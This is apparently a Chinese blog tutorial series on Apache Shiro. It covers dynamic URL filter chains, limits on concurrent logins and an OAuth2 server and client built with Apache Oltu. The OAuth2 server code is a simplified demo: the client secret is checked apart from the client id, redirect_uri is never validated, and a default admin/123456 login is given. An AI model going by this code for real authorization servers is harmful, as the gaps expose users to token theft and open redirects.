CustomDefaultFilterChainManager    
public class CustomDefaultFilterChainManager extends DefaultFilterChainManager {
    private Map<String, String> filterChainDefinitionMap = null;
    private String loginUrl;
    private String successUrl;
    private String unauthorizedUrl;
    public CustomDefaultFilterChainManager() {
        setFilters(new LinkedHashMap<String, Filter>());
        setFilterChains(new LinkedHashMap<String, NamedFilterList>());
        addDefaultFilters(true);
    }
    public Map<String, String> getFilterChainDefinitionMap() {
        return filterChainDefinitionMap;
    }
    public void setFilterChainDefinitionMap(Map<String, String> filterChainDefinitionMap) {
        this.filterChainDefinitionMap = filterChainDefinitionMap;
    }
    public void setCustomFilters(Map<String, Filter> customFilters) {
        for(Map.Entry<String, Filter> entry : customFilters.entrySet()) {
            addFilter(entry.getKey(), entry.getValue(), false);
        }
}
    public void setDefaultFilterChainDefinitions(String definitions) {
        Ini ini = new Ini();
        ini.load(definitions);
        Ini.Section section = ini.getSection(IniFilterChainResolverFactory.URLS);
        if (CollectionUtils.isEmpty(section)) {
            section = ini.getSection(Ini.DEFAULT_SECTION_NAME);
        }
        setFilterChainDefinitionMap(section);
    }
    public String getLoginUrl() {
        return loginUrl;
    }
    public void setLoginUrl(String loginUrl) {
        this.loginUrl = loginUrl;
    }
    public String getSuccessUrl() {
        return successUrl;
    }
    public void setSuccessUrl(String successUrl) {
        this.successUrl = successUrl;
    }
    public String getUnauthorizedUrl() {
        return unauthorizedUrl;
    }
    public void setUnauthorizedUrl(String unauthorizedUrl) {
        this.unauthorizedUrl = unauthorizedUrl;
    }
    @PostConstruct
    public void init() {
        Map<String, Filter> filters = getFilters();
        if (!CollectionUtils.isEmpty(filters)) {
            for (Map.Entry<String, Filter> entry : filters.entrySet()) {
                String name = entry.getKey();
                Filter filter = entry.getValue();
                applyGlobalPropertiesIfNecessary(filter);
                if (filter instanceof Nameable) {
                    ((Nameable) filter).setName(name);
                }
                addFilter(name, filter, false);
            }
        }
        Map<String, String> chains = getFilterChainDefinitionMap();
        if (!CollectionUtils.isEmpty(chains)) {
            for (Map.Entry<String, String> entry : chains.entrySet()) {
                String url = entry.getKey();
                String chainDefinition = entry.getValue();
                createChain(url, chainDefinition);
            }
        }
    }
    protected void initFilter(Filter filter) {
        //ignore 
    }
    public FilterChain proxy(FilterChain original, List<String> chainNames) {
        NamedFilterList configured = new SimpleNamedFilterList(chainNames.toString());
        for(String chainName : chainNames) {
            configured.addAll(getChain(chainName));
        }
        return configured.proxy(original);
    }
    private void applyGlobalPropertiesIfNecessary(Filter filter) {
        applyLoginUrlIfNecessary(filter);
        applySuccessUrlIfNecessary(filter);
        applyUnauthorizedUrlIfNecessary(filter);
    }
    private void applyLoginUrlIfNecessary(Filter filter) {
        //请参考源码
    }
    private void applySuccessUrlIfNecessary(Filter filter) {
        //请参考源码
    }
    private void applyUnauthorizedUrlIfNecessary(Filter filter) {
        //请参考源码
    }
} 
1、CustomDefaultFilterChainManager：调用其构造器时，会自动注册默认的拦截器；
2、loginUrl、successUrl、unauthorizedUrl：分别对应登录地址、登录成功后默认跳转地址、未授权跳转地址，用于给相应拦截器的；
3、filterChainDefinitionMap：用于存储如ShiroFilterFactoryBean在配置文件中配置的拦截器链定义，即可以认为是默认的静态拦截器链；会自动与数据库中加载的合并；
4、setDefaultFilterChainDefinitions：解析配置文件中传入的字符串拦截器链配置，解析为相应的拦截器链；
5、setCustomFilters：注册我们自定义的拦截器；如ShiroFilterFactoryBean的filters属性；
6、init：初始化方法，Spring容器启动时会调用，首先其会自动给相应的拦截器设置如loginUrl、successUrl、unauthorizedUrl；其次根据filterChainDefinitionMap构建默认的拦截器链；
7、initFilter：此处我们忽略实现initFilter，因为交给spring管理了，所以Filter的相关配置会在Spring配置中完成；
8、proxy：组合多个拦截器链为一个生成一个新的FilterChain代理。
 
Web层控制器 
请参考com.github.zhangkaitao.shiro.chapter19.web.controller包，相对于第十六章添加了UrlFilterController用于UrlFilter的维护。另外，移除了控制器方法上的权限注解，而是使用动态URL拦截进行控制。
 
Spring配置——spring-config-shiro.xml   
<bean id="filterChainManager" 
    class="com.github.zhangkaitao.shiro.spring.CustomDefaultFilterChainManager">
    <property name="loginUrl" value="/login"/>
    <property name="successUrl" value="/"/>
    <property name="unauthorizedUrl" value="/unauthorized.jsp"/>
    <property name="customFilters">
        <util:map>
            <entry key="authc" value-ref="formAuthenticationFilter"/>
            <entry key="sysUser" value-ref="sysUserFilter"/>
        </util:map>
    </property>
    <property name="defaultFilterChainDefinitions">
        <value>
            /login = authc
            /logout = logout
            /unauthorized.jsp = authc
            /** = user,sysUser
        </value>
    </property>
</bean> 
filterChainManager是我们自定义的CustomDefaultFilterChainManager，注册相应的拦截器及默认的拦截器链。 
<bean id="filterChainResolver" 
    class="com.github.zhangkaitao.shiro.spring.CustomPathMatchingFilterChainResolver">
    <property name="customDefaultFilterChainManager" ref="filterChainManager"/>
</bean> 
filterChainResolver是自定义的CustomPathMatchingFilterChainResolver，使用上边的filterChainManager进行拦截器链的管理。 
<bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">
    <property name="securityManager" ref="securityManager"/>
</bean> 
shiroFilter不再定义filters及filterChainDefinitions，而是交给了filterChainManager进行完成。 
<bean class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="targetObject" ref="shiroFilter"/>
    <property name="targetMethod" value="setFilterChainResolver"/>
    <property name="arguments" ref="filterChainResolver"/>
</bean> 
最后把filterChainResolver注册给shiroFilter，其使用它进行动态URL权限控制。
 
其他配置和第十六章一样，请参考第十六章。
 
测试
1、首先执行shiro-data.sql初始化数据。
2、然后再URL管理中新增如下数据： 
3、访问http://localhost:8080/chapter19/user时要求用户拥有aa角色，此时是没有的所以会跳转到未授权页面；
4、添加aa角色然后授权给用户，此时就有权限访问http://localhost:8080/chapter19/user。
 
实际项目可以在此基础上进行扩展。
 
     
 
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 6 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第十八章 并发登录人数控制——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2039760, Wed, 02 Apr 2014 08:45:15 +0800

 
目录贴： 跟我学Shiro目录贴
 
在某些项目中可能会遇到如每个账户同时只能有一个人登录或几个人同时登录，如果同时有多人登录：要么不让后者登录；要么踢出前者登录（强制退出）。比如spring security就直接提供了相应的功能；Shiro的话没有提供默认实现，不过可以很容易的在Shiro中加入这个功能。
 
示例代码基于《第十六章 综合实例》完成，通过Shiro Filter机制扩展KickoutSessionControlFilter完成。
 
首先来看看如何配置使用（spring-config-shiro.xml）
  
kickoutSessionControlFilter用于控制并发登录人数的 
<bean id="kickoutSessionControlFilter" 
class="com.github.zhangkaitao.shiro.chapter18.web.shiro.filter.KickoutSessionControlFilter">
    <property name="cacheManager" ref="cacheManager"/>
    <property name="sessionManager" ref="sessionManager"/>
    <property name="kickoutAfter" value="false"/>
    <property name="maxSession" value="2"/>
    <property name="kickoutUrl" value="/login?kickout=1"/>
</bean> 
cacheManager：使用cacheManager获取相应的cache来缓存用户登录的会话；用于保存用户—会话之间的关系的；
sessionManager：用于根据会话ID，获取会话进行踢出操作的；
kickoutAfter：是否踢出后来登录的，默认是false；即后者登录的用户踢出前者登录的用户；
maxSession：同一个用户最大的会话数，默认1；比如2的意思是同一个用户允许最多同时两个人登录；
kickoutUrl：被踢出后重定向到的地址；
 
shiroFilter配置 
   <bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">
        <property name="securityManager" ref="securityManager"/>
        <property name="loginUrl" value="/login"/>
        <property name="filters">
            <util:map>
                <entry key="authc" value-ref="formAuthenticationFilter"/>
                <entry key="sysUser" value-ref="sysUserFilter"/>
                <entry key="kickout" value-ref="kickoutSessionControlFilter"/>
            </util:map>
        </property>
        <property name="filterChainDefinitions">
            <value>
                /login = authc
                /logout = logout
                /authenticated = authc
                /** = kickout,user,sysUser
            </value>
        </property>
    </bean> 
此处配置除了登录等之外的地址都走kickout拦截器进行并发登录控制。
 
测试
此处因为maxSession=2，所以需要打开3个浏览器（需要不同的浏览器，如IE、Chrome、Firefox），分别访问http://localhost:8080/chapter18/进行登录；然后刷新第一次打开的浏览器，将会被强制退出，如显示下图： 
KickoutSessionControlFilter核心代码： 
protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
    Subject subject = getSubject(request, response);
    if(!subject.isAuthenticated() && !subject.isRemembered()) {
        //如果没有登录，直接进行之后的流程
        return true;
    }
    Session session = subject.getSession();
    String username = (String) subject.getPrincipal();
    Serializable sessionId = session.getId();
    //TODO 同步控制
    Deque<Serializable> deque = cache.get(username);
    if(deque == null) {
        deque = new LinkedList<Serializable>();
        cache.put(username, deque);
    }
    //如果队列里没有此sessionId，且用户没有被踢出；放入队列
    if(!deque.contains(sessionId) && session.getAttribute("kickout") == null) {
        deque.push(sessionId);
    }
    //如果队列里的sessionId数超出最大会话数，开始踢人
    while(deque.size() > maxSession) {
        Serializable kickoutSessionId = null;
        if(kickoutAfter) { //如果踢出后者
            kickoutSessionId = deque.removeFirst();
        } else { //否则踢出前者
            kickoutSessionId = deque.removeLast();
        }
        try {
            Session kickoutSession =
                sessionManager.getSession(new DefaultSessionKey(kickoutSessionId));
            if(kickoutSession != null) {
                //设置会话的kickout属性表示踢出了
                kickoutSession.setAttribute("kickout", true);
            }
        } catch (Exception e) {//ignore exception
        }
    }
    //如果被踢出了，直接退出，重定向到踢出后的地址
    if (session.getAttribute("kickout") != null) {
        //会话被踢出了
        try {
            subject.logout();
        } catch (Exception e) { //ignore
        }
        saveRequest(request);
        WebUtils.issueRedirect(request, response, kickoutUrl);
        return false;
    }
    return true;
} 
此处使用了Cache缓存用户名—会话id之间的关系；如果量比较大可以考虑如持久化到数据库/其他带持久化的Cache中；另外此处没有并发控制的同步实现，可以考虑根据用户名获取锁来控制，减少锁的粒度。
 
另外可参考JavaEE项目开发脚手架，其提供了后台踢出用户的功能：
https://github.com/zhangkaitao/es/blob/master/web/src/main/java/com/sishuok/es/sys/user/web/controller/UserOnlineController.java 
    
 
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 8 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第十七章  OAuth2集成——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2038646, Mon, 31 Mar 2014 07:50:12 +0800

 
目录贴： 跟我学Shiro目录贴
 
 
目前很多开放平台如新浪微博开放平台都在使用提供开放API接口供开发者使用，随之带来了第三方应用要到开放平台进行授权的问题，OAuth就是干这个的，OAuth2是OAuth协议的下一个版本，相比OAuth1，OAuth2整个授权流程更简单安全了，但不兼容OAuth1，具体可以到OAuth2官网http://oauth.net/2/查看，OAuth2协议规范可以参考http://tools.ietf.org/html/rfc6749。目前有好多参考实现供选择，可以到其官网查看下载。
 
本文使用Apache Oltu，其之前的名字叫Apache Amber ，是Java版的参考实现。使用文档可参考https://cwiki.apache.org/confluence/display/OLTU/Documentation。
 
OAuth角色
资源拥有者（resource owner）：能授权访问受保护资源的一个实体，可以是一个人，那我们称之为最终用户；如新浪微博用户zhangsan；
资源服务器（resource server）：存储受保护资源，客户端通过access token请求资源，资源服务器响应受保护资源给客户端；存储着用户zhangsan的微博等信息。
授权服务器（authorization server）：成功验证资源拥有者并获取授权之后，授权服务器颁发授权令牌（Access Token）给客户端。
客户端（client）：如新浪微博客户端weico、微格等第三方应用，也可以是它自己的官方应用；其本身不存储资源，而是资源拥有者授权通过后，使用它的授权（授权令牌）访问受保护资源，然后客户端把相应的数据展示出来/提交到服务器。“客户端”术语不代表任何特定实现（如应用运行在一台服务器、桌面、手机或其他设备）。 
 
OAuth2协议流程
 
1、客户端从资源拥有者那请求授权。授权请求可以直接发给资源拥有者，或间接的通过授权服务器这种中介，后者更可取。
2、客户端收到一个授权许可，代表资源服务器提供的授权。
3、客户端使用它自己的私有证书及授权许可到授权服务器验证。
4、如果验证成功，则下发一个访问令牌。
5、客户端使用访问令牌向资源服务器请求受保护资源。
6、资源服务器会验证访问令牌的有效性，如果成功则下发受保护资源。
 
更多流程的解释请参考OAuth2的协议规范http://tools.ietf.org/html/rfc6749。
 
服务器端
本文把授权服务器和资源服务器整合在一起实现。
 
POM依赖
此处我们使用apache oltu oauth2服务端实现，需要引入authzserver（授权服务器依赖）和resourceserver（资源服务器依赖）。 
<dependency>
    <groupId>org.apache.oltu.oauth2</groupId>
    <artifactId>org.apache.oltu.oauth2.authzserver</artifactId>
    <version>0.31</version>
</dependency>
<dependency>
    <groupId>org.apache.oltu.oauth2</groupId>
    <artifactId>org.apache.oltu.oauth2.resourceserver</artifactId>
    <version>0.31</version>
</dependency> 
其他的请参考pom.xml。
 
数据字典
用户(oauth2_user)
名称
类型
长度
描述
id
bigint
10
编号 主键
username
varchar
100
用户名
password
varchar
100
密码
salt
varchar
50
盐
客户端(oauth2_client)
名称
类型
长度
描述
id
bigint
10
编号 主键
client_name
varchar
100
客户端名称
client_id
varchar
100
客户端id
client_secret
varchar
100
客户端安全key
 
用户表存储着认证/资源服务器的用户信息，即资源拥有者；比如用户名/密码；客户端表存储客户端的的客户端id及客户端安全key；在进行授权时使用。
 
表及数据SQL
具体请参考
sql/ shiro-schema.sql （表结构）
sql/ shiro-data.sql  （初始数据）
 
默认用户名/密码是admin/123456。
 
实体
具体请参考com.github.zhangkaitao.shiro.chapter17.entity包下的实体，此处就不列举了。
 
DAO
具体请参考com.github.zhangkaitao.shiro.chapter17.dao包下的DAO接口及实现。
 
Service
具体请参考com.github.zhangkaitao.shiro.chapter17.service包下的Service接口及实现。以下是出了基本CRUD之外的关键接口： 
public interface UserService {
    public User createUser(User user);// 创建用户
    public User updateUser(User user);// 更新用户
    public void deleteUser(Long userId);// 删除用户
    public void changePassword(Long userId, String newPassword); //修改密码
    User findOne(Long userId);// 根据id查找用户
    List<User> findAll();// 得到所有用户
    public User findByUsername(String username);// 根据用户名查找用户
}
public interface ClientService {
    public Client createClient(Client client);// 创建客户端
    public Client updateClient(Client client);// 更新客户端
    public void deleteClient(Long clientId);// 删除客户端
    Client findOne(Long clientId);// 根据id查找客户端
    List<Client> findAll();// 查找所有
    Client findByClientId(String clientId);// 根据客户端id查找客户端
    Client findByClientSecret(String clientSecret);//根据客户端安全KEY查找客户端
}
public interface OAuthService {
   public void addAuthCode(String authCode, String username);// 添加 auth code
   public void addAccessToken(String accessToken, String username); // 添加 access token
   boolean checkAuthCode(String authCode); // 验证auth code是否有效
   boolean checkAccessToken(String accessToken); // 验证access token是否有效
   String getUsernameByAuthCode(String authCode);// 根据auth code获取用户名
   String getUsernameByAccessToken(String accessToken);// 根据access token获取用户名
   long getExpireIn();//auth code / access token 过期时间
   public boolean checkClientId(String clientId);// 检查客户端id是否存在
   public boolean checkClientSecret(String clientSecret);// 坚持客户端安全KEY是否存在
} 
此处通过OAuthService实现进行auth code和access token的维护。
 
后端数据维护控制器
具体请参考com.github.zhangkaitao.shiro.chapter17.web.controller包下的IndexController、LoginController、UserController和ClientController，其用于维护后端的数据，如用户及客户端数据；即相当于后台管理。
 
授权控制器AuthorizeController      
@Controller
public class AuthorizeController {
  @Autowired
  private OAuthService oAuthService;
  @Autowired
  private ClientService clientService;
  @RequestMapping("/authorize")
  public Object authorize(Model model,  HttpServletRequest request)
        throws URISyntaxException, OAuthSystemException {
    try {
      //构建OAuth 授权请求
      OAuthAuthzRequest oauthRequest = new OAuthAuthzRequest(request);
      //检查传入的客户端id是否正确
      if (!oAuthService.checkClientId(oauthRequest.getClientId())) {
        OAuthResponse response = OAuthASResponse
             .errorResponse(HttpServletResponse.SC_BAD_REQUEST)
             .setError(OAuthError.TokenResponse.INVALID_CLIENT)
             .setErrorDescription(Constants.INVALID_CLIENT_DESCRIPTION)
             .buildJSONMessage();
        return new ResponseEntity(
           response.getBody(), HttpStatus.valueOf(response.getResponseStatus()));
      }
      Subject subject = SecurityUtils.getSubject();
      //如果用户没有登录，跳转到登陆页面
      if(!subject.isAuthenticated()) {
        if(!login(subject, request)) {//登录失败时跳转到登陆页面
          model.addAttribute("client",    
              clientService.findByClientId(oauthRequest.getClientId()));
          return "oauth2login";
        }
      }
      String username = (String)subject.getPrincipal();
      //生成授权码
      String authorizationCode = null;
      //responseType目前仅支持CODE，另外还有TOKEN
      String responseType = oauthRequest.getParam(OAuth.OAUTH_RESPONSE_TYPE);
      if (responseType.equals(ResponseType.CODE.toString())) {
        OAuthIssuerImpl oauthIssuerImpl = new OAuthIssuerImpl(new MD5Generator());
        authorizationCode = oauthIssuerImpl.authorizationCode();
        oAuthService.addAuthCode(authorizationCode, username);
      }
      //进行OAuth响应构建
      OAuthASResponse.OAuthAuthorizationResponseBuilder builder =
        OAuthASResponse.authorizationResponse(request, 
                                           HttpServletResponse.SC_FOUND);
      //设置授权码
      builder.setCode(authorizationCode);
      //得到到客户端重定向地址
      String redirectURI = oauthRequest.getParam(OAuth.OAUTH_REDIRECT_URI);
      //构建响应
      final OAuthResponse response = builder.location(redirectURI).buildQueryMessage();
      //根据OAuthResponse返回ResponseEntity响应
      HttpHeaders headers = new HttpHeaders();
      headers.setLocation(new URI(response.getLocationUri()));
      return new ResponseEntity(headers, HttpStatus.valueOf(response.getResponseStatus()));
    } catch (OAuthProblemException e) {
      //出错处理
      String redirectUri = e.getRedirectUri();
      if (OAuthUtils.isEmpty(redirectUri)) {
        //告诉客户端没有传入redirectUri直接报错
        return new ResponseEntity(
          "OAuth callback url needs to be provided by client!!!", HttpStatus.NOT_FOUND);
      }
      //返回错误消息（如?error=）
      final OAuthResponse response =
              OAuthASResponse.errorResponse(HttpServletResponse.SC_FOUND)
                      .error(e).location(redirectUri).buildQueryMessage();
      HttpHeaders headers = new HttpHeaders();
      headers.setLocation(new URI(response.getLocationUri()));
      return new ResponseEntity(headers, HttpStatus.valueOf(response.getResponseStatus()));
    }
  }
  private boolean login(Subject subject, HttpServletRequest request) {
    if("get".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String username = request.getParameter("username");
    String password = request.getParameter("password");
    if(StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) {
      return false;
    }
    UsernamePasswordToken token = new UsernamePasswordToken(username, password);
    try {
      subject.login(token);
      return true;
    } catch (Exception e) {
      request.setAttribute("error", "登录失败:" + e.getClass().getName());
      return false;
    }
  }
} 
如上代码的作用：
1、首先通过如http://localhost:8080/chapter17-server/authorize
?client_id=c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&response_type=code&redirect_uri=http://localhost:9080/chapter17-client/oauth2-login访问授权页面；
2、该控制器首先检查clientId是否正确；如果错误将返回相应的错误信息；
3、然后判断用户是否登录了，如果没有登录首先到登录页面登录；
4、登录成功后生成相应的auth code即授权码，然后重定向到客户端地址，如http://localhost:9080/chapter17-client/oauth2-login?code=52b1832f5dff68122f4f00ae995da0ed；在重定向到的地址中会带上code参数（授权码），接着客户端可以根据授权码去换取access token。
 
访问令牌控制器AccessTokenController  
@RestController
public class AccessTokenController {
  @Autowired
  private OAuthService oAuthService;
  @Autowired
  private UserService userService;
  @RequestMapping("/accessToken")
  public HttpEntity token(HttpServletRequest request)
          throws URISyntaxException, OAuthSystemException {
    try {
      //构建OAuth请求
      OAuthTokenRequest oauthRequest = new OAuthTokenRequest(request);
      //检查提交的客户端id是否正确
      if (!oAuthService.checkClientId(oauthRequest.getClientId())) {
        OAuthResponse response = OAuthASResponse
                .errorResponse(HttpServletResponse.SC_BAD_REQUEST)
                .setError(OAuthError.TokenResponse.INVALID_CLIENT)
                .setErrorDescription(Constants.INVALID_CLIENT_DESCRIPTION)
                .buildJSONMessage();
       return new ResponseEntity(
         response.getBody(), HttpStatus.valueOf(response.getResponseStatus()));
      }
    // 检查客户端安全KEY是否正确
      if (!oAuthService.checkClientSecret(oauthRequest.getClientSecret())) {
        OAuthResponse response = OAuthASResponse
              .errorResponse(HttpServletResponse.SC_UNAUTHORIZED)
              .setError(OAuthError.TokenResponse.UNAUTHORIZED_CLIENT)
              .setErrorDescription(Constants.INVALID_CLIENT_DESCRIPTION)
              .buildJSONMessage();
      return new ResponseEntity(
          response.getBody(), HttpStatus.valueOf(response.getResponseStatus()));
      }
  
      String authCode = oauthRequest.getParam(OAuth.OAUTH_CODE);
      // 检查验证类型，此处只检查AUTHORIZATION_CODE类型，其他的还有PASSWORD或REFRESH_TOKEN
      if (oauthRequest.getParam(OAuth.OAUTH_GRANT_TYPE).equals(
         GrantType.AUTHORIZATION_CODE.toString())) {
         if (!oAuthService.checkAuthCode(authCode)) {
            OAuthResponse response = OAuthASResponse
                .errorResponse(HttpServletResponse.SC_BAD_REQUEST)
                .setError(OAuthError.TokenResponse.INVALID_GRANT)
                .setErrorDescription("错误的授权码")
              .buildJSONMessage();
           return new ResponseEntity(
             response.getBody(), HttpStatus.valueOf(response.getResponseStatus()));
         }
      }
      //生成Access Token
      OAuthIssuer oauthIssuerImpl = new OAuthIssuerImpl(new MD5Generator());
      final String accessToken = oauthIssuerImpl.accessToken();
      oAuthService.addAccessToken(accessToken,
          oAuthService.getUsernameByAuthCode(authCode));
      //生成OAuth响应
      OAuthResponse response = OAuthASResponse
              .tokenResponse(HttpServletResponse.SC_OK)
              .setAccessToken(accessToken)
              .setExpiresIn(String.valueOf(oAuthService.getExpireIn()))
              .buildJSONMessage();
      //根据OAuthResponse生成ResponseEntity
      return new ResponseEntity(
          response.getBody(), HttpStatus.valueOf(response.getResponseStatus()));
    } catch (OAuthProblemException e) {
      //构建错误响应
      OAuthResponse res = OAuthASResponse
              .errorResponse(HttpServletResponse.SC_BAD_REQUEST).error(e)
              .buildJSONMessage();
     return new ResponseEntity(res.getBody(), HttpStatus.valueOf(res.getResponseStatus()));
   }
 }
} 
如上代码的作用：
1、首先通过如http://localhost:8080/chapter17-server/accessToken，POST提交如下数据：client_id= c1ebe466-1cdc-4bd3-ab69-77c3561b9dee& client_secret= d8346ea2-6017-43ed-ad68-19c0f971738b&grant_type=authorization_code&code=828beda907066d058584f37bcfd597b6&redirect_uri=http://localhost:9080/chapter17-client/oauth2-login访问；
2、该控制器会验证client_id、client_secret、auth code的正确性，如果错误会返回相应的错误；
3、如果验证通过会生成并返回相应的访问令牌access token。
 
资源控制器UserInfoController  
@RestController
public class UserInfoController {
  @Autowired
  private OAuthService oAuthService;
  @RequestMapping("/userInfo")
  public HttpEntity userInfo(HttpServletRequest request) throws OAuthSystemException {
    try {
      //构建OAuth资源请求
      OAuthAccessResourceRequest oauthRequest = 
            new OAuthAccessResourceRequest(request, ParameterStyle.QUERY);
      //获取Access Token
      String accessToken = oauthRequest.getAccessToken();
      //验证Access Token
      if (!oAuthService.checkAccessToken(accessToken)) {
        // 如果不存在/过期了，返回未验证错误，需重新验证
      OAuthResponse oauthResponse = OAuthRSResponse
              .errorResponse(HttpServletResponse.SC_UNAUTHORIZED)
              .setRealm(Constants.RESOURCE_SERVER_NAME)
              .setError(OAuthError.ResourceResponse.INVALID_TOKEN)
              .buildHeaderMessage();
        HttpHeaders headers = new HttpHeaders();
        headers.add(OAuth.HeaderType.WWW_AUTHENTICATE, 
          oauthResponse.getHeader(OAuth.HeaderType.WWW_AUTHENTICATE));
      return new ResponseEntity(headers, HttpStatus.UNAUTHORIZED);
      }
      //返回用户名
      String username = oAuthService.getUsernameByAccessToken(accessToken);
      return new ResponseEntity(username, HttpStatus.OK);
    } catch (OAuthProblemException e) {
      //检查是否设置了错误码
      String errorCode = e.getError();
      if (OAuthUtils.isEmpty(errorCode)) {
        OAuthResponse oauthResponse = OAuthRSResponse
               .errorResponse(HttpServletResponse.SC_UNAUTHORIZED)
               .setRealm(Constants.RESOURCE_SERVER_NAME)
               .buildHeaderMessage();
        HttpHeaders headers = new HttpHeaders();
        headers.add(OAuth.HeaderType.WWW_AUTHENTICATE, 
          oauthResponse.getHeader(OAuth.HeaderType.WWW_AUTHENTICATE));
        return new ResponseEntity(headers, HttpStatus.UNAUTHORIZED);
      }
      OAuthResponse oauthResponse = OAuthRSResponse
               .errorResponse(HttpServletResponse.SC_UNAUTHORIZED)
               .setRealm(Constants.RESOURCE_SERVER_NAME)
               .setError(e.getError())
               .setErrorDescription(e.getDescription())
               .setErrorUri(e.getUri())
               .buildHeaderMessage();
      HttpHeaders headers = new HttpHeaders();
      headers.add(OAuth.HeaderType.WWW_AUTHENTICATE, 、
        oauthResponse.getHeader(OAuth.HeaderType.WWW_AUTHENTICATE));
      return new ResponseEntity(HttpStatus.BAD_REQUEST);
    }
  }
} 
如上代码的作用：
1、首先通过如http://localhost:8080/chapter17-server/userInfo? access_token=828beda907066d058584f37bcfd597b6进行访问；
2、该控制器会验证access token的有效性；如果无效了将返回相应的错误，客户端再重新进行授权；
3、如果有效，则返回当前登录用户的用户名。
 
Spring配置文件
具体请参考resources/spring*.xml，此处只列举spring-config-shiro.xml中的shiroFilter的filterChainDefinitions属性：  
<property name="filterChainDefinitions">
    <value>
      / = anon
      /login = authc
      /logout = logout
      /authorize=anon
      /accessToken=anon
      /userInfo=anon
      /** = user
    </value>
</property> 
对于oauth2的几个地址/authorize、/accessToken、/userInfo都是匿名可访问的。
 
其他源码请直接下载文档查看。
 
服务器维护
访问localhost:8080/chapter17-server/，登录后进行客户端管理和用户管理。
客户端管理就是进行客户端的注册，如新浪微博的第三方应用就需要到新浪微博开发平台进行注册；用户管理就是进行如新浪微博用户的管理。
 
对于授权服务和资源服务的实现可以参考新浪微博开发平台的实现：
http://open.weibo.com/wiki/授权机制说明 
http://open.weibo.com/wiki/微博API 
 
客户端
客户端流程：如果需要登录首先跳到oauth2服务端进行登录授权，成功后服务端返回auth code，然后客户端使用auth code去服务器端换取access token，最好根据access token获取用户信息进行客户端的登录绑定。这个可以参照如很多网站的新浪微博登录功能，或其他的第三方帐号登录功能。
POM依赖
此处我们使用apache oltu oauth2客户端实现。     
<dependency>
  <groupId>org.apache.oltu.oauth2</groupId>
  <artifactId>org.apache.oltu.oauth2.client</artifactId>
  <version>0.31</version>
</dependency> 
其他的请参考pom.xml。
 
OAuth2Token
类似于UsernamePasswordToken和CasToken；用于存储oauth2服务端返回的auth code。  
public class OAuth2Token implements AuthenticationToken {
    private String authCode;
    private String principal;
    public OAuth2Token(String authCode) {
        this.authCode = authCode;
    }
    //省略getter/setter
} 
  
OAuth2AuthenticationFilter
该filter的作用类似于FormAuthenticationFilter用于oauth2客户端的身份验证控制；如果当前用户还没有身份验证，首先会判断url中是否有code（服务端返回的auth code），如果没有则重定向到服务端进行登录并授权，然后返回auth code；接着OAuth2AuthenticationFilter会用auth code创建OAuth2Token，然后提交给Subject.login进行登录；接着OAuth2Realm会根据OAuth2Token进行相应的登录逻辑。  
public class OAuth2AuthenticationFilter extends AuthenticatingFilter {
    //oauth2 authc code参数名
    private String authcCodeParam = "code";
    //客户端id
    private String clientId;
    //服务器端登录成功/失败后重定向到的客户端地址
    private String redirectUrl;
    //oauth2服务器响应类型
    private String responseType = "code";
    private String failureUrl;
    //省略setter
    protected AuthenticationToken createToken(ServletRequest request, ServletResponse response) throws Exception {
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String code = httpRequest.getParameter(authcCodeParam);
        return new OAuth2Token(code);
    }
    protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {
        return false;
    }
    protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
        String error = request.getParameter("error");
        String errorDescription = request.getParameter("error_description");
        if(!StringUtils.isEmpty(error)) {//如果服务端返回了错误
            WebUtils.issueRedirect(request, response, failureUrl + "?error=" + error + "error_description=" + errorDescription);
            return false;
        }
        Subject subject = getSubject(request, response);
        if(!subject.isAuthenticated()) {
            if(StringUtils.isEmpty(request.getParameter(authcCodeParam))) {
                //如果用户没有身份验证，且没有auth code，则重定向到服务端授权
                saveRequestAndRedirectToLogin(request, response);
                return false;
            }
        }
        //执行父类里的登录逻辑，调用Subject.login登录
        return executeLogin(request, response);
    }
    //登录成功后的回调方法 重定向到成功页面
    protected boolean onLoginSuccess(AuthenticationToken token, Subject subject, ServletRequest request,  ServletResponse response) throws Exception {
        issueSuccessRedirect(request, response);
        return false;
    }
    //登录失败后的回调 
    protected boolean onLoginFailure(AuthenticationToken token, AuthenticationException ae, ServletRequest request,
                                     ServletResponse response) {
        Subject subject = getSubject(request, response);
        if (subject.isAuthenticated() || subject.isRemembered()) {
            try { //如果身份验证成功了 则也重定向到成功页面
                issueSuccessRedirect(request, response);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            try { //登录失败时重定向到失败页面
                WebUtils.issueRedirect(request, response, failureUrl);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return false;
    }
} 
该拦截器的作用：
1、首先判断有没有服务端返回的error参数，如果有则直接重定向到失败页面；
2、接着如果用户还没有身份验证，判断是否有auth code参数（即是不是服务端授权之后返回的），如果没有则重定向到服务端进行授权；
3、否则调用executeLogin进行登录，通过auth code创建OAuth2Token提交给Subject进行登录；
4、登录成功将回调onLoginSuccess方法重定向到成功页面；
5、登录失败则回调onLoginFailure重定向到失败页面。
 
OAuth2Realm  
public class OAuth2Realm extends AuthorizingRealm {
    private String clientId;
    private String clientSecret;
    private String accessTokenUrl;
    private String userInfoUrl;
    private String redirectUrl;
    //省略setter
    public boolean supports(AuthenticationToken token) {
        return token instanceof OAuth2Token; //表示此Realm只支持OAuth2Token类型
    }
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
        SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
